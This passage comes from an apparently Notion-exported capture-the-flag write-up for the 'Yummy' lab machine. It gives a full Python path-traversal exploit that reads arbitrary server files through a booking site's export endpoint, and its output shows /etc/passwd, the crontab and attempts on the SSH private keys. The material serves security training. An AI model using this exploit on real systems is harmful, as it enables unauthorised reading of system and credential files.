+	<span class="token keyword">if</span> ref <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>YELLOW <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[!] No booking reference found. Attempting to make a booking."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		book<span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span>
+		ref <span class="token operator">=</span> find_ref<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+		<span class="token keyword">if</span> ref <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+			<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] No booking reference found again."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+			exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[+] Booking reference found: </span><span class="token interpolation"><span class="token punctuation">{</span>ref<span class="token punctuation">}</span></span><span class="token string">."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+	<span class="token keyword">return</span> ref
+
+<span class="token keyword">def</span> <span class="token function">find_ref</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	dashboard_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/dashboard"</span></span>
+	cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"X-AUTH-Token"</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span>
+
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>dashboard_url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+	<span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Something went wrong."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Error: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Session expired."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span>
+	links <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> class_<span class="token operator">=</span><span class="token string">"book-a-table-btn"</span><span class="token punctuation">)</span>
+	
+	<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>links<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
+
+	ref <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>links<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"href"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+	<span class="token keyword">return</span> ref
+
+<span class="token keyword">def</span> <span class="token function">book</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	book_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/book"</span></span>
+	cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"X-AUTH-Token"</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span>
+	data <span class="token operator">=</span> <span class="token punctuation">{</span>
+		<span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"John Doe"</span><span class="token punctuation">,</span>
+		<span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>
+		<span class="token string">"phone"</span><span class="token punctuation">:</span> <span class="token string">"1234567890"</span><span class="token punctuation">,</span>
+		<span class="token string">"date"</span><span class="token punctuation">:</span> <span class="token string">"2025-12-31"</span><span class="token punctuation">,</span>
+		<span class="token string">"time"</span><span class="token punctuation">:</span> <span class="token string">"23:59"</span><span class="token punctuation">,</span>
+		<span class="token string">"people"</span><span class="token punctuation">:</span> <span class="token string">"10"</span><span class="token punctuation">,</span>
+		<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"bookings"</span>
+	<span class="token punctuation">}</span>
+
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>book_url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+	<span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Something went wrong."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Error: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">400</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Unknown error occurred."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[+] Booking made."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+	<span class="token keyword">return</span>
+
+<span class="token keyword">def</span> <span class="token function">file_read</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> ref<span class="token punctuation">,</span> path<span class="token punctuation">,</span> email<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	session <span class="token operator">=</span> get_session<span class="token punctuation">(</span>token<span class="token punctuation">,</span> ref<span class="token punctuation">)</span>
+	<span class="token keyword">if</span> session <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Session expired."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	export_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/export/../../../../../..</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+	cookies <span class="token operator">=</span> <span class="token punctuation">{</span>
+		<span class="token string">"X-AUTH-Token"</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span>
+		<span class="token string">"session"</span><span class="token punctuation">:</span> session
+	<span class="token punctuation">}</span>
+
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		<span class="token comment"># Ref: https://github.com/psf/requests/issues/5289</span>
+		s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		req <span class="token operator">=</span> requests<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>method<span class="token operator">=</span><span class="token string">'GET'</span><span class="token punctuation">,</span> url<span class="token operator">=</span>export_url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
+		p <span class="token operator">=</span> req<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		p<span class="token punctuation">.</span>url <span class="token operator">=</span> export_url
+		r <span class="token operator">=</span> s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+	<span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Something went wrong."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Error: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"File read successful:"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+	<span class="token keyword">elif</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>YELLOW <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[!] File not found."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>YELLOW <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[!] Failed to read file."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>YELLOW <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[!] Status code: </span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+	
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">return</span>
+
+<span class="token keyword">def</span> <span class="token function">get_session</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> ref<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	sess_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/reminder/</span><span class="token interpolation"><span class="token punctuation">{</span>ref<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+	cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"X-AUTH-Token"</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span>
+
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sess_url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+	<span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Something went wrong."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Error: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	headers <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+	<span class="token keyword">if</span> <span class="token string">'Set-Cookie'</span> <span class="token keyword">in</span> headers<span class="token punctuation">:</span>
+		session <span class="token operator">=</span> headers<span class="token punctuation">[</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+		<span class="token keyword">return</span> session
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span> <span class="token boolean">None</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Usage: python </span><span class="token interpolation"><span class="token punctuation">{</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string"> &lt;email> &lt;password>"</span></span><span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	email <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+	password <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+
+	<span class="token comment"># login</span>
+	token <span class="token operator">=</span> authenticate<span class="token punctuation">(</span>email<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
+
+	<span class="token comment"># find booking reference(book-a-table-btn a href)</span>
+	ref <span class="token operator">=</span> get_ref<span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span>
+
+	<span class="token comment"># file read (while loop)</span>
+	<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[*] Full path of file to read: (enter 'exit' to quit)"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		path <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string">">> "</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>path <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+			<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Exiting..."</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+			exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+		file_read<span class="token punctuation">(</span>token<span class="token punctuation">,</span> ref<span class="token punctuation">,</span> path<span class="token punctuation">,</span> email<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+	main<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780d1ba96c29b98e77413" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The script runs on an infinite loop and prints out the specified files, provided it exists and have read permission.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780849fddcaadcca2a673" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> python file_read.py &#x27;ch3ng@ch3ng.com&#x27; &#x27;ch3ng&#x27;
+
+[*] Authenticating...
+[+] Authentication successful.
+[+] Booking reference found: 21.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /etc/passwd
+File read successful:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+pollinate:x:102:1::/var/cache/pollinate:/bin/false
+polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
+syslog:x:103:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
+tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+dev:x:1000:1000:dev:/home/dev:/bin/bash
+mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
+caddy:x:999:988:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
+postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
+qa:x:1001:1001::/home/qa:/bin/bash
+_laurel:x:996:987::/var/log/laurel:/bin/false
+
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt; </span></mark></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780f09d2ace2dd24b1a44" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It has two console users: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dev</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">qa</code></span><span class="SemanticString">. However, I cannot read their private keys nor the flag.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f7801a9b8dd39829a9dcd6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /home/qa/user.txt
+[-] Failed to read file.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /home/dev/user.txt
+[-] Failed to read file.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /home/qa/.ssh/id_rsa
+[-] Failed to read file.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /home/dev/.ssh/id_rsa
+[-] Failed to read file.</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78051a94dec359d694b71" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://caddyserver.com/docs/conventions">Caddy config file</a></span><span class="SemanticString"> is also readable, but does not contain anything useful.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78055a684f0ec5c190736" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /etc/caddy/Caddyfile
+File read successful:
+:80 {
+    @ip {
+        header_regexp Host ^(\d{1,3}\.){3}\d{1,3}$
+    }
+    redir @ip http://yummy.htb{uri}
+    reverse_proxy 127.0.0.1:3000 {
+    header_down -Server  
+    }
+}
+</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780bb8c41e70233c910f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f78033ac08cbd2a91eae04" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Cron Jobs:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f78006b3ecfe53227b79c5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/crontab</code></span><span class="SemanticString"> can be read too, and it listed 3 frequent cron jobs, two of which runs every minute.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780dcac35f079353f3ac5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /etc/crontab
+File read successful:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root	cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.daily; }
+47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.weekly; }
+52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.monthly; }
+#
+*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
+*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
+* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78025a6f0e6ac208dafbf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dbmonitor.sh</code></span><span class="SemanticString"> is checking the status of the MySQL service:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78073b905e7c1ac68ec37" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /data/scripts/dbmonitor.sh
+File read successful:
+#!/bin/bash
+
+timestamp=$(/usr/bin/date)
+service=mysql
+response=$(/usr/bin/systemctl is-active mysql)
+
